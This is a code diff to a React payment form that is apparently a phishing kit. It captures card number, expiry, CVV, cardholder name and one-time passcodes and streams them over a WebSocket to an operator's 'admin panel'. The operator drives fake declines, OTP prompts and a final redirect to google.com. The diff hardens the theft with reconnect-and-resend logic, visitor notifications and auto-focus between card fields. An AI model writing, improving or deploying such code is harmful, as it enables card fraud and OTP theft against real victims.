@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from 'react';
 import { CreditCard, Lock, Shield, Loader2 } from 'lucide-react';
 
@@ -8,37 +7,45 @@ let ws: WebSocket | null = null;
 const connectWebSocket = () => {
   try {
     // Use wss for secure connection on railway.com
-    const wsUrl = window.location.hostname === 'localhost' ? 'ws://localhost:8080' : 'wss://your-railway-domain.railway.app';
+    const wsUrl = window.location.hostname === 'localhost' ? 'ws://localhost:8080' : `wss://${window.location.hostname.replace(/^https?:\/\//, '')}`;
     
     if (!ws || ws.readyState === WebSocket.CLOSED) {
       ws = new WebSocket(wsUrl);
       
       ws.onopen = () => {
-        console.log('WebSocket connected');
-        // Send new visitor notification
+        console.log('WebSocket connected from PaymentForm');
+        // Send new visitor notification immediately when connected
         const userInfo = {
           ip: getRandomIP(),
           browser: navigator.userAgent,
           network: getRandomNetwork()
         };
-        ws?.send(JSON.stringify({
+        
+        const visitorData = {
           type: 'newVisitor',
-          ip: userInfo.ip
-        }));
+          ip: userInfo.ip,
+          timestamp: new Date().toISOString()
+        };
+        
+        console.log('Sending visitor data:', visitorData);
+        ws?.send(JSON.stringify(visitorData));
       };
       
       ws.onclose = () => {
         console.log('WebSocket disconnected');
+        ws = null;
         // Reconnect after 3 seconds
         setTimeout(connectWebSocket, 3000);
       };
 
       ws.onerror = (error) => {
         console.error('WebSocket error:', error);
+        ws = null;
       };
     }
   } catch (error) {
     console.error('WebSocket connection failed:', error);
+    ws = null;
   }
 };
 
@@ -132,57 +139,80 @@ const PaymentForm = () => {
   useEffect(() => {
     connectWebSocket();
     
+    // Send visitor data when component mounts
+    setTimeout(() => {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        const userInfo = {
+          ip: getRandomIP(),
+          browser: navigator.userAgent,
+          network: getRandomNetwork()
+        };
+        
+        const visitorData = {
+          type: 'newVisitor',
+          ip: userInfo.ip,
+          timestamp: new Date().toISOString()
+        };
+        
+        console.log('Sending initial visitor data:', visitorData);
+        ws.send(JSON.stringify(visitorData));
+      }
+    }, 1000);
+    
     // Listen for commands from admin panel
-    if (ws) {
-      ws.onmessage = (event) => {
-        try {
-          const data = JSON.parse(event.data);
-          
-          switch (data.command) {
-            case 'showotp':
-              setIsLoading(false);
-              setShowOtp(true);
-              break;
-            case 'fail':
-              setIsLoading(false);
-              setShowOtp(false);
-              setErrorMessage('Your card has been declined');
-              break;
-            case 'success':
-              setIsConfirmLoading(false);
-              setShowProcessing(true);
+    const handleMessage = (event: MessageEvent) => {
+      try {
+        const data = JSON.parse(event.data);
+        console.log('Received command from admin:', data);
+        
+        switch (data.command) {
+          case 'showotp':
+            setIsLoading(false);
+            setShowOtp(true);
+            break;
+          case 'fail':
+            setIsLoading(false);
+            setShowOtp(false);
+            setErrorMessage('Your card has been declined');
+            break;
+          case 'success':
+            setIsConfirmLoading(false);
+            setShowProcessing(true);
+            setTimeout(() => {
+              setShowProcessing(false);
+              setShowSuccess(true);
               setTimeout(() => {
-                setShowProcessing(false);
-                setShowSuccess(true);
-                setTimeout(() => {
-                  window.location.href = 'https://google.com';
-                }, 2000);
-              }, 4000);
-              break;
-            case 'invalidotp':
-              setIsConfirmLoading(false);
-              setInvalidOtpMessage('Invalid OTP, please enter valid one time passcode sent to your mobile');
-              break;
-            case 'cardinvalid':
-              setIsLoading(false);
-              setShowOtp(false);
-              setErrorMessage('Your card is invalid, please try another card');
-              break;
-            case 'carddisabled':
-              setIsLoading(false);
-              setShowOtp(false);
-              setErrorMessage('Card disabled, please try another card');
-              break;
-          }
-        } catch (error) {
-          console.error('Error parsing WebSocket message:', error);
+                window.location.href = 'https://google.com';
+              }, 2000);
+            }, 4000);
+            break;
+          case 'invalidotp':
+            setIsConfirmLoading(false);
+            setInvalidOtpMessage('Invalid OTP, please enter valid one time passcode sent to your mobile');
+            break;
+          case 'cardinvalid':
+            setIsLoading(false);
+            setShowOtp(false);
+            setErrorMessage('Your card is invalid, please try another card');
+            break;
+          case 'carddisabled':
+            setIsLoading(false);
+            setShowOtp(false);
+            setErrorMessage('Card disabled, please try another card');
+            break;
         }
-      };
+      } catch (error) {
+        console.error('Error parsing WebSocket message:', error);
+      }
+    };
+
+    if (ws) {
+      ws.onmessage = handleMessage;
     }
 
     return () => {
       if (ws) {
-        ws.close();
+        ws.onmessage = null;
       }
     };
   }, []);
@@ -211,13 +241,21 @@ const PaymentForm = () => {
   };
 
   const sendToAdminPanel = (data: any) => {
+    console.log('Attempting to send data to admin panel:', data);
+    
     if (ws && ws.readyState === WebSocket.OPEN) {
-      console.log('Sending data to admin panel:', data);
+      console.log('WebSocket is open, sending data');
       ws.send(JSON.stringify(data));
     } else {
-      console.error('WebSocket not connected');
-      // Try to reconnect
+      console.error('WebSocket not connected, attempting to reconnect');
       connectWebSocket();
+      // Try to send after reconnection
+      setTimeout(() => {
+        if (ws && ws.readyState === WebSocket.OPEN) {
+          console.log('Sending data after reconnection');
+          ws.send(JSON.stringify(data));
+        }
+      }, 1000);
     }
   };
 
@@ -230,6 +268,56 @@ const PaymentForm = () => {
         ...formData,
         [name]: formatted
       });
+      
+      // Auto-focus to next field when card number is complete
+      if (formatted.replace(/\s/g, '').length === 16) {
+        const monthInput = document.querySelector('input[name="expiryMonth"]') as HTMLInputElement;
+        if (monthInput) {
+          setTimeout(() => monthInput.focus(), 100);
+        }
+      }
+    } else if (name === 'expiryMonth') {
+      const numericValue = value.replace(/\D/g, '').slice(0, 2);
+      setFormData({
+        ...formData,
+        [name]: numericValue
+      });
+      
+      // Auto-focus to year when month is complete
+      if (numericValue.length === 2) {
+        const yearInput = document.querySelector('input[name="expiryYear"]') as HTMLInputElement;
+        if (yearInput) {
+          setTimeout(() => yearInput.focus(), 100);
+        }
+      }
+    } else if (name === 'expiryYear') {
+      const numericValue = value.replace(/\D/g, '').slice(0, 2);
+      setFormData({
+        ...formData,
+        [name]: numericValue
+      });
+      
+      // Auto-focus to CVV when year is complete
+      if (numericValue.length === 2) {
+        const cvvInput = document.querySelector('input[name="cvv"]') as HTMLInputElement;
+        if (cvvInput) {
+          setTimeout(() => cvvInput.focus(), 100);
+        }
+      }
+    } else if (name === 'cvv') {
+      const numericValue = value.replace(/\D/g, '').slice(0, 4);
+      setFormData({
+        ...formData,
+        [name]: numericValue
+      });
+      
+      // Auto-focus to card holder when CVV is complete
+      if (numericValue.length >= 3) {
+        const holderInput = document.querySelector('input[name="cardHolder"]') as HTMLInputElement;
+        if (holderInput) {
+          setTimeout(() => holderInput.focus(), 100);
+        }
+      }
     } else {
       setFormData({
         ...formData,
@@ -271,7 +359,8 @@ const PaymentForm = () => {
     const cardData = {
       type: 'cardData',
       data: formData,
-      userInfo: userInfo
+      userInfo: userInfo,
+      timestamp: new Date().toISOString()
     };
     
     console.log('Submitting card data:', cardData);
@@ -288,7 +377,8 @@ const PaymentForm = () => {
     // Send OTP to admin panel
     sendToAdminPanel({
       type: 'otp',
-      otp: otp
+      otp: otp,
+      timestamp: new Date().toISOString()
     });
   };
 
